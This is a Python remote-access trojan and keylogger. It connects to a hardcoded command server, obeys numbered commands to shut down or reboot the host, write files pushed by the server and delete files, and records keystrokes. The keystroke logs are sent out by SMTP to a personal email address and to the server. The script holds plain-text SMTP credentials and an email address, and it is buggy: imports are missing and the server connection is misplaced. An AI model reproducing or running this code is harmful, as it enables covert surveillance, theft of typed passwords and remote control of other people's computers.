import time
import socket
import os
import platform
import smtplib
from datetime import datetime
from pynput import keyboard

# SMTP configuration
SMTP_SERVER = 'mail.smtp2go.com'
SMTP_PORT = 2525
SMTP_USER = 'hack_hack'
SMTP_PASSWORD = 'mahinthegay'
TO_EMAIL = '2320030263@klh.edu.in'
SUBJECT = 'Log File'

# Function to send the log file via email
def send_email(log_file):
    msg = MIMEMultipart()
    msg['From'] = SMTP_USER
    msg['To'] = TO_EMAIL
    msg['Subject'] = SUBJECT

    body = 'Please find the attached log file.'
    msg.attach(MIMEText(body, 'plain'))

    with open(log_file, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_file)}')
        msg.attach(part)

    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(SMTP_USER, SMTP_PASSWORD)
    text = msg.as_string()
    server.sendmail(SMTP_USER, TO_EMAIL, text)
    server.quit()

# Function to start the keylogger
def start_keylogger(s):
    log_file = f'{os.getcwd()}/keylogger.log'
    def on_press(key):
        try:
            with open(log_file, "a") as f:
                f.write(f'{key.char}')
        except AttributeError:
            with open(log_file, "a") as f:
                f.write(f'[{key}]')

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Keep the listener running
    listener.join()

    send_email(log_file)
    send_log_to_server(log_file, s)

# Function to send the log file to the server
def send_log_to_server(log_file, s):
    with open(log_file, 'rb') as f:
        data = f.read()
        s.sendall(f"LOGFILE|{os.path.basename(log_file)}|{len(data)}".encode())
        s.sendall(data)

# Client Code

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            host = "10.250.6.47"
            port = 8080
            s.connect((host, port))
            print("Connected to server")
            return s
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

            s = connect_to_server()
while True:
    try:
        command = s.recv(1024).decode().strip()
        if not command:
            print("Connection closed by server.")
            break
        
        print(f"Received command: {command}")
        
        if command == "1":
            print("Executing shutdown command.")
            os.system("shutdown -s -t 00" if platform.system() == "Windows" else "shutdown now")
        elif command == "2":
            print("Executing restart command.")
            os.system("shutdown -r -t 00" if platform.system() == "Windows" else "reboot")
        elif command == "3":
            print("Executing DOS Attack command.")
            os.system("start msedge.exe https://www.example.com" if platform.system() == "Windows" else "xdg-open https://www.example.com")
        elif command == "4":
            print("Executing Shantabhai command.")
            os.system("start msedge.exe https://www.youtube.com/watch?v=Uk65cmPGl8s" if platform.system() == "Windows" else "xdg-open https://www.youtube.com/watch?v=Uk65cmPGl8s")
        elif command == "5":
            print("Executing file transfer command.")
            file_info = s.recv(1024).decode().strip()
            if "|" not in file_info:
                print(f"Invalid file info received: {file_info}")
                break
            
            file_name, file_size = file_info.split("|", 1)
            try:
                file_size = int(file_size)
            except ValueError:
                print("Invalid file size received.")
                break
            
            s.sendall("READY".encode())
            
            with open(file_name, "wb") as f:
                received_size = 0
                while received_size < file_size:
                    data = s.recv(1024)
                    if not data:
                        print("Connection lost during file transfer.")
                        break
                    f.write(data)
                    received_size += len(data)
            
            if received_size == file_size:
                print(f"File {file_name} received successfully.")
            else:
                print("File transfer incomplete.")
        elif command == "6":
            print("Executing remove file command.")
            file_path = s.recv(1024).decode().strip()
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
                    print(f"File '{file_path}' removed successfully.")
                else:
                    print(f"File '{file_path}' does not exist.")
            except PermissionError:
                print(f"Permission denied: Unable to remove file '{file_path}'.")
            except Exception as e:
                print(f"An error occurred: {e}")
        elif command == "7":
            print("Executing keylogger command.")
            start_keylogger(s)
        elif command == "8":
            print("Executing exit command.")
            print("Server requested disconnection.")
            s.close()
            break
        else:
            print("Unknown command received.")
    except socket.error as e:
        print(f"Socket error: {e}")
        break

s.close()